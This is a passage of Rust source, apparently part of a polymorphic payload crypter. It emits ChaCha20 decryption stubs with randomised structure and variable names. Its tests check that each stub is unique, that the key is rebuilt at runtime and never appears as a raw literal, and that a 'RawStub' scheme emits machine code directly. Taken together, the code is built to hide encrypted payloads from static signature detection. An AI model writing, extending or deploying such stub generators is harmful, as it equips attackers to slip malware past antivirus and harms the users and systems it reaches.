    if rng.gen_bool(0.5) {
        // Style A: inline QR operations, no helper functions
        format!(
    "    let {v_key}: ::std::vec::Vec<u8> = reconstruct_key();
    let {v_consts}: [u32; 4] = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];
    let mut {v_kwords}: [u32; 8] = [0; 8];
    for i in 0..8usize {{ {v_kwords}[i] = u32::from_le_bytes({v_key}[i*4..i*4+4].try_into().unwrap()); }}
    let mut {v_nwords}: [u32; 3] = [0; 3];
    for i in 0..3usize {{ {v_nwords}[i] = u32::from_le_bytes({v_key}[32+i*4..32+i*4+4].try_into().unwrap()); }}
    let mut {v_ctr}: u32 = 1;
    let mut {v_ks}: [u8; 64] = [0; 64];
    let mut {v_npos}: usize = 64;
    let mut {v_out}: ::std::vec::Vec<u8> = ::std::vec::Vec::with_capacity({v_ct}.len());
    for &{v_b} in {v_ct} {{
        if {v_npos} >= 64 {{
            let mut {v_work}: [u32; 16] = [{v_consts}[0],{v_consts}[1],{v_consts}[2],{v_consts}[3],{v_kwords}[0],{v_kwords}[1],{v_kwords}[2],{v_kwords}[3],{v_kwords}[4],{v_kwords}[5],{v_kwords}[6],{v_kwords}[7],{v_ctr},{v_nwords}[0],{v_nwords}[1],{v_nwords}[2]];
            let {v_state} = {v_work};
            for _ in 0..10 {{
                let (mut a,mut b,mut c,mut d)=({v_work}[0],{v_work}[4],{v_work}[8],{v_work}[12]); a=a.wrapping_add(b);d^=a;d=d.rotate_left(16);c=c.wrapping_add(d);b^=c;b=b.rotate_left(12);a=a.wrapping_add(b);d^=a;d=d.rotate_left(8);c=c.wrapping_add(d);b^=c;b=b.rotate_left(7); {v_work}[0]=a;{v_work}[4]=b;{v_work}[8]=c;{v_work}[12]=d;
                let (mut a,mut b,mut c,mut d)=({v_work}[1],{v_work}[5],{v_work}[9],{v_work}[13]); a=a.wrapping_add(b);d^=a;d=d.rotate_left(16);c=c.wrapping_add(d);b^=c;b=b.rotate_left(12);a=a.wrapping_add(b);d^=a;d=d.rotate_left(8);c=c.wrapping_add(d);b^=c;b=b.rotate_left(7); {v_work}[1]=a;{v_work}[5]=b;{v_work}[9]=c;{v_work}[13]=d;
                let (mut a,mut b,mut c,mut d)=({v_work}[2],{v_work}[6],{v_work}[10],{v_work}[14]); a=a.wrapping_add(b);d^=a;d=d.rotate_left(16);c=c.wrapping_add(d);b^=c;b=b.rotate_left(12);a=a.wrapping_add(b);d^=a;d=d.rotate_left(8);c=c.wrapping_add(d);b^=c;b=b.rotate_left(7); {v_work}[2]=a;{v_work}[6]=b;{v_work}[10]=c;{v_work}[14]=d;
                let (mut a,mut b,mut c,mut d)=({v_work}[3],{v_work}[7],{v_work}[11],{v_work}[15]); a=a.wrapping_add(b);d^=a;d=d.rotate_left(16);c=c.wrapping_add(d);b^=c;b=b.rotate_left(12);a=a.wrapping_add(b);d^=a;d=d.rotate_left(8);c=c.wrapping_add(d);b^=c;b=b.rotate_left(7); {v_work}[3]=a;{v_work}[7]=b;{v_work}[11]=c;{v_work}[15]=d;
                let (mut a,mut b,mut c,mut d)=({v_work}[0],{v_work}[5],{v_work}[10],{v_work}[15]); a=a.wrapping_add(b);d^=a;d=d.rotate_left(16);c=c.wrapping_add(d);b^=c;b=b.rotate_left(12);a=a.wrapping_add(b);d^=a;d=d.rotate_left(8);c=c.wrapping_add(d);b^=c;b=b.rotate_left(7); {v_work}[0]=a;{v_work}[5]=b;{v_work}[10]=c;{v_work}[15]=d;
                let (mut a,mut b,mut c,mut d)=({v_work}[1],{v_work}[6],{v_work}[11],{v_work}[12]); a=a.wrapping_add(b);d^=a;d=d.rotate_left(16);c=c.wrapping_add(d);b^=c;b=b.rotate_left(12);a=a.wrapping_add(b);d^=a;d=d.rotate_left(8);c=c.wrapping_add(d);b^=c;b=b.rotate_left(7); {v_work}[1]=a;{v_work}[6]=b;{v_work}[11]=c;{v_work}[12]=d;
                let (mut a,mut b,mut c,mut d)=({v_work}[2],{v_work}[7],{v_work}[8],{v_work}[13]); a=a.wrapping_add(b);d^=a;d=d.rotate_left(16);c=c.wrapping_add(d);b^=c;b=b.rotate_left(12);a=a.wrapping_add(b);d^=a;d=d.rotate_left(8);c=c.wrapping_add(d);b^=c;b=b.rotate_left(7); {v_work}[2]=a;{v_work}[7]=b;{v_work}[8]=c;{v_work}[13]=d;
                let (mut a,mut b,mut c,mut d)=({v_work}[3],{v_work}[4],{v_work}[9],{v_work}[14]); a=a.wrapping_add(b);d^=a;d=d.rotate_left(16);c=c.wrapping_add(d);b^=c;b=b.rotate_left(12);a=a.wrapping_add(b);d^=a;d=d.rotate_left(8);c=c.wrapping_add(d);b^=c;b=b.rotate_left(7); {v_work}[3]=a;{v_work}[4]=b;{v_work}[9]=c;{v_work}[14]=d;
            }}
            for i in 0..16usize {{ let v = {v_work}[i].wrapping_add({v_state}[i]); {v_ks}[i*4..i*4+4].copy_from_slice(&v.to_le_bytes()); }}
            {v_ctr} = {v_ctr}.wrapping_add(1);
            {v_npos} = 0;
        }}
        {v_out}.push({v_b} ^ {v_ks}[{v_npos}]);
        {v_npos} += 1;
    }}
    {v_out}
",
        )
    } else {
        // Style B: with extracted helper functions
        format!(
"    fn {v_qr}(mut a: u32, mut b: u32, mut c: u32, mut d: u32) -> (u32, u32, u32, u32) {{
        a = a.wrapping_add(b); d ^= a; d = d.rotate_left(16);
        c = c.wrapping_add(d); b ^= c; b = b.rotate_left(12);
        a = a.wrapping_add(b); d ^= a; d = d.rotate_left(8);
        c = c.wrapping_add(d); b ^= c; b = b.rotate_left(7);
        (a, b, c, d)
    }}
    fn {v_block}({v_state}: &[u32; 16]) -> [u8; 64] {{
        let mut w = *{v_state};
        for _ in 0..10 {{
            let (a,b,c,d)={v_qr}(w[0],w[4],w[8],w[12]); w[0]=a;w[4]=b;w[8]=c;w[12]=d;
            let (a,b,c,d)={v_qr}(w[1],w[5],w[9],w[13]); w[1]=a;w[5]=b;w[9]=c;w[13]=d;
            let (a,b,c,d)={v_qr}(w[2],w[6],w[10],w[14]); w[2]=a;w[6]=b;w[10]=c;w[14]=d;
            let (a,b,c,d)={v_qr}(w[3],w[7],w[11],w[15]); w[3]=a;w[7]=b;w[11]=c;w[15]=d;
            let (a,b,c,d)={v_qr}(w[0],w[5],w[10],w[15]); w[0]=a;w[5]=b;w[10]=c;w[15]=d;
            let (a,b,c,d)={v_qr}(w[1],w[6],w[11],w[12]); w[1]=a;w[6]=b;w[11]=c;w[12]=d;
            let (a,b,c,d)={v_qr}(w[2],w[7],w[8],w[13]); w[2]=a;w[7]=b;w[8]=c;w[13]=d;
            let (a,b,c,d)={v_qr}(w[3],w[4],w[9],w[14]); w[3]=a;w[4]=b;w[9]=c;w[14]=d;
        }}
        let mut out = [0u8; 64];
        for i in 0..16 {{ let v = w[i].wrapping_add({v_state}[i]); out[i*4..i*4+4].copy_from_slice(&v.to_le_bytes()); }}
        out
    }}
    let {v_key}: ::std::vec::Vec<u8> = reconstruct_key();
    let {v_consts}: [u32; 4] = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];
    let mut {v_kwords}: [u32; 8] = [0; 8];
    for i in 0..8 {{ {v_kwords}[i] = u32::from_le_bytes({v_key}[i*4..i*4+4].try_into().unwrap()); }}
    let mut {v_nwords}: [u32; 3] = [0; 3];
    for i in 0..3 {{ {v_nwords}[i] = u32::from_le_bytes({v_key}[32+i*4..32+i*4+4].try_into().unwrap()); }}
    let mut {v_ctr}: u32 = 1;
    let mut {v_npos}: usize = 64;
    let mut {v_ks}: [u8; 64] = [0; 64];
    {v_ct}.iter().map(|&{v_b}| {{
        if {v_npos} >= 64 {{
            let s: [u32; 16] = [{v_consts}[0],{v_consts}[1],{v_consts}[2],{v_consts}[3],{v_kwords}[0],{v_kwords}[1],{v_kwords}[2],{v_kwords}[3],{v_kwords}[4],{v_kwords}[5],{v_kwords}[6],{v_kwords}[7],{v_ctr},{v_nwords}[0],{v_nwords}[1],{v_nwords}[2]];
            {v_ks} = {v_block}(&s);
            {v_ctr} = {v_ctr}.wrapping_add(1);
            {v_npos} = 0;
        }}
        let r = {v_b} ^ {v_ks}[{v_npos}];
        {v_npos} += 1;
        r
    }}).collect()
",
        )
    }
}

// ── Helpers ───────────────────────────────────────────────────────────────────

fn byte_array_literal(bytes: &[u8]) -> String {
    bytes
        .iter()
        .map(|b| format!("0x{:02x}u8", b))
        .collect::<Vec<_>>()
        .join(", ")
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn aes256_ctr_stream_roundtrip() {
        let pt = b"aes256-ctr stream cipher test payload";
        let key: Vec<u8> = (0..48).map(|i| i as u8).collect();
        let ct = aes256_ctr_stream(pt, &key);
        assert_ne!(&ct[..], &pt[..]);
        assert_eq!(&aes256_ctr_stream(&ct, &key), pt);
    }

    #[test]
    fn chacha20_stream_roundtrip() {
        let pt = b"chacha20 stream cipher test payload!";
        let key: Vec<u8> = (0..44).map(|i| i as u8).collect();
        let ct = chacha20_stream(pt, &key);
        assert_ne!(&ct[..], &pt[..]);
        assert_eq!(&chacha20_stream(&ct, &key), pt);
    }

    #[test]
    fn poly_wrap_serialize_roundtrip() {
        let pt = b"full poly wrap test";
        let blob = poly_wrap(pt);
        let serialized = poly_serialize(&blob);

        assert_eq!(&serialized[..4], b"POLY");
        assert_eq!(serialized[4], blob.scheme.byte());

        assert!(matches!(
            blob.scheme,
            PolyScheme::AesCtrStream | PolyScheme::ChaCha20Stream | PolyScheme::RawStub
        ));

        let key_len = u32::from_be_bytes(serialized[5..9].try_into().unwrap()) as usize;
        assert_eq!(key_len, blob.key.len());

        match blob.scheme {
            PolyScheme::AesCtrStream => assert_eq!(key_len, 48),
            PolyScheme::ChaCha20Stream => assert_eq!(key_len, 44),
            PolyScheme::RawStub => assert!(key_len > 0, "RawStub stub code must be non-empty"),
        }

        let ct_len_off = 9 + key_len;
        let ct_len =
            u32::from_be_bytes(serialized[ct_len_off..ct_len_off + 4].try_into().unwrap())
                as usize;
        assert_eq!(ct_len, blob.ciphertext.len());
        assert_eq!(serialized.len(), ct_len_off + 4 + ct_len);
    }

    #[test]
    fn poly_emit_stub_is_unique() {
        // RawStub always returns the same comment — test only source-emitting schemes.
        let mut blob = poly_wrap(b"variation test");
        let mut attempts = 0;
        while blob.scheme == PolyScheme::RawStub {
            blob = poly_wrap(b"variation test");
            attempts += 1;
            assert!(attempts < 100, "all poly_wrap calls returned RawStub");
        }
        let stub_a = poly_emit_stub(&blob);
        let stub_b = poly_emit_stub(&blob);
        // Two stubs for the same blob should differ (different variable names + build token).
        assert_ne!(stub_a, stub_b);
    }

    #[test]
    fn stub_reconstructs_key_and_hides_raw_literals() {
        // RawStub emits machine code directly — no Rust source key embedding.
        // Run this test with a non-RawStub scheme.
        let mut blob = poly_wrap(b"stub key test");
        // Retry until we get a scheme that emits Rust source.
        let mut attempts = 0;
        while blob.scheme == PolyScheme::RawStub {
            blob = poly_wrap(b"stub key test");
            attempts += 1;
            assert!(attempts < 100, "all poly_wrap calls returned RawStub");
        }
        let stub = poly_emit_stub(&blob);

        // The generated source must contain runtime reconstruction.
        assert!(
            stub.contains("fn reconstruct_key() -> ::std::vec::Vec<u8>"),
            "stub missing reconstruct_key function"
        );
        assert!(
            stub.contains("hkdf::Hkdf::<::sha2::Sha256>"),
            "stub missing HKDF-SHA256 reconstruction path"
        );

        // Raw key must not appear as a contiguous literal sequence.
        let full_raw_key_lit = byte_array_literal(&blob.key);
        assert!(
            !stub.contains(&full_raw_key_lit),
            "stub leaked full raw key literal"
        );

        // Allow accidental single-byte collisions, but reject any 8-byte
        // contiguous raw-key window appearing in source.
        for i in 0..=blob.key.len().saturating_sub(8) {
            let window_lit = byte_array_literal(&blob.key[i..i + 8]);
            assert!(
                !stub.contains(&window_lit),
                "stub leaked contiguous raw-key literal window starting at byte {i}"
            );
        }
    }

    #[test]
    fn masked_key_not_equal_to_real_key() {
        fn extract_literal_bytes(stub: &str) -> Vec<u8> {
            let marker = ": &[u8] = &[";
            let start = stub
                .find(marker)
                .expect("masked key literal start marker not found")
                + marker.len();
            let after_bracket = &stub[start..];
            let bracket_end = after_bracket
                .find("];")
                .expect("masked key literal end not found");
            let raw = &after_bracket[..bracket_end];
            raw.split(',')
                .map(|s| s.trim())
                .filter(|s| !s.is_empty())
                .map(|tok| {
                    let hex = tok
                        .strip_prefix("0x")
                        .and_then(|v| v.strip_suffix("u8"))
                        .expect("unexpected key byte token format");
                    u8::from_str_radix(hex, 16).expect("invalid hex key byte")
                })
                .collect()
        }

        let mut blob = poly_wrap(b"mask coverage test payload");
        let mut attempts = 0;
        while blob.scheme == PolyScheme::RawStub {
            blob = poly_wrap(b"mask coverage test payload");
            attempts += 1;
            assert!(attempts < 100, "all poly_wrap calls returned RawStub");
        }
        let stub = poly_emit_stub(&blob);
        let masked = extract_literal_bytes(&stub);

        assert_eq!(masked.len(), blob.key.len(), "masked key length mismatch");

        let diff = masked
            .iter()
            .zip(blob.key.iter())
            .filter(|(a, b)| a != b)
            .count();
        assert!(
            diff * 2 >= blob.key.len(),
            "expected >=50% bytes to differ, got {diff}/{}",
            blob.key.len()
        );
    }
}
